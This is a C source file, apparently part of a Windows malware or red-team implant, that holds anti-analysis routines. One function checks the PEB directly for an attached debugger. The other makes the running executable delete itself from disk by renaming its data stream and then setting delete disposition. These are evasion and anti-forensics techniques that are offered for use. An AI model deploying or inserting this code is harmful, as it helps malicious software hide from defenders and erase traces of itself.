#include <stdio.h>
#include <Windows.h>
#include "structs.h"
#include "antianalysis.h"
#include "stringutils.h"
#include "memutils.h"
#include "config.h"

#ifdef DBG_EVASION
static PPEB GetPeb(void) {
#if _WIN64
    return (PPEB)(__readgsqword(0x60));
#elif _WIN32
    return (PPEB)(__readfsdword(0x30));
#endif
    return NULL;
}


BOOL _IsDebuggerPresent(void) {
    PPEB pPeb = GetPeb();
    if (pPeb->BeingDebugged == 1) 
        return TRUE;
    else
        return FALSE;
}
#endif // DBG_EVASION

#ifdef SELF_DESTRUCT
BOOL DeleteSelf(void) {
    BOOL bResult = FALSE;
    HANDLE hFile = NULL;
    WCHAR wPath[MAX_PATH * 2] = { 0 };
    WCHAR wStreamName[32] = { 0 };
    SIZE_T sStreamLen = 0;
    SIZE_T sRenameSize = 0;
    PFILE_RENAME_INFO pRenameInfo = NULL;
    FILE_DISPOSITION_INFO fdi = { .DeleteFile = TRUE };

    _wcscpy_s(wStreamName, ARRAYSIZE(wStreamName), L":to_be_deleted");
    sStreamLen = _wcslen(wStreamName) * sizeof(WCHAR);
    sRenameSize = sizeof(FILE_RENAME_INFO) + sStreamLen;

    if (!(pRenameInfo = (PFILE_RENAME_INFO)_heapalloc(sRenameSize)))
        return FALSE;

    pRenameInfo->FileNameLength = (DWORD)sStreamLen;
    _memcpy(pRenameInfo->FileName, wStreamName, sStreamLen);

    if (GetModuleFileNameW(NULL, wPath, ARRAYSIZE(wPath)) == 0) {
        goto CLEANUP;
    }

    if ((hFile = CreateFileW(wPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE)
        goto CLEANUP;

    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRenameInfo, (DWORD)sRenameSize))
        goto CLEANUP;

    DELETE_HANDLE(hFile);

    if ((hFile = CreateFileW(wPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE)
        goto CLEANUP;

    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &fdi, sizeof(fdi)))
        goto CLEANUP;

    bResult = TRUE;

CLEANUP:
    DELETE_HANDLE(hFile);
    HEAP_FREE(pRenameInfo);
    return bResult;
}
#endif // ENABLE_SELF_DELETION
